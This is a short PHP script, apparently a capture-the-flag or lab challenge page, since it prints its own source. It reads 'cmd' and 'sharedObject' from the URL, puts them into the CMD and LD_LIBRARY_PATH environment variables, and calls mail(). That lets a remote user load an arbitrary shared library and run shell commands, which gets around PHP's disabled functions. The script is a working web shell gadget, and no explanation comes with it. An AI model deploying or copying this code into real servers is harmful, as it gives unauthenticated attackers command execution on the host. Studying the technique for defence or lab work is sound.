<?php
echo "Source: <BR>";
show_source(__FILE__);
echo "<HR>";
if(isset($_GET['cmd']) && isset($_GET['sharedObject']) ){
 $cmd = $_GET['cmd'];
 echo "Executing $cmd..";
 putenv("CMD=$cmd");
 $sharedObject = $_GET['sharedObject'];
 putenv("LD_LIBRARY_PATH=$sharedObject");
 mail('g','i','o','o');
}
?>
